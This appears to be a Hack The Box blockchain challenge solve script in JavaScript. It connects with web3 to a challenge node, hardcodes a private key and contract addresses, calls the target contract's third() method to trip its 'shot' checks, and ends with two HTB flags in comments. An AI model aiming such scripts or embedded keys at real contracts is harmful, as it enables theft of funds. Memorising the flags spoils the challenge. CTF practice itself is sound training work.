var Web3 = require('web3');
var provider = 'http://188.166.152.84:30912/';
var web3Provider = new Web3.providers.HttpProvider(provider);
var web3 = new Web3(web3Provider);

var Private_key = "0x2e5b747a0c8009addae5da70fb85de376bad9ff32441c26fc2036ed5c73a870c"
var Address = "0x40ff681460AFfB1FDE92Ea7076b1Be6876C100E9"
var Target_contract = "0x3C5f115646Ef40FC5438da6e85d071f2d24DC3a2"
var Setup_contract = "0x9B5e58200b6c371bc540b3f3d6F4A40431A52101"

// web3.eth.getBlockNumber().then((result) => {
//   console.log("Latest Block is ",result);
// });

// web3.eth.getBalance(Target_contract).then(console.log);

let contract = new web3.eth.Contract([
      {
        "stateMutability": "payable",
        "type": "fallback"
      },
      {
        "inputs": [],
        "name": "firstShot",
        "outputs": [
          {
            "internalType": "bool",
            "name": "",
            "type": "bool"
          }
        ],
        "stateMutability": "view",
        "type": "function"
      },
      {
        "inputs": [],
        "name": "secondShot",
        "outputs": [
          {
            "internalType": "bool",
            "name": "",
            "type": "bool"
          }
        ],
        "stateMutability": "view",
        "type": "function"
      },
      {
        "inputs": [],
        "name": "third",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
      },
      {
        "inputs": [],
        "name": "thirdShot",
        "outputs": [
          {
            "internalType": "bool",
            "name": "",
            "type": "bool"
          }
        ],
        "stateMutability": "view",
        "type": "function"
      },
      {
        "stateMutability": "payable",
        "type": "receive"

      }],Target_contract)



//web3.eth.sendTransaction({from:Address,to:Target_contract,value:"1"}).then(console.log)

contract.methods.third().send({from:Address}).then(console.log)

contract.methods.firstShot().call().then(console.log)
contract.methods.secondShot().call().then(console.log)
contract.methods.thirdShot().call().then(console.log)

//FLAG=HTB{9P5_50FtW4R3_UPd4t3D}
//FLAG=HTB{f33l5_n1c3_h1771n6_y0ur_74r6375}